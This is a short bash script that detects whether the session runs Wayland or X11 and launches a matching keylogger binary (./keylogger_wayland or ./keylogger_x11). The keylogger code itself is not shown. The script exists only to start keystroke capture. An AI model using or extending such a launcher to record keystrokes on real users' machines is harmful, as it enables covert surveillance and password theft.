#!/bin/bash

# Detect if running Wayland or X11
if [ "$XDG_SESSION_TYPE" == "wayland" ]; then
    echo "Wayland detected."
    ./keylogger_wayland
elif [ "$XDG_SESSION_TYPE" == "x11" ]; then
    echo "X11 detected."
    ./keylogger_x11
else
    echo "Unknown display server. Ensure you're running either X11 or Wayland."
    exit 1
fi
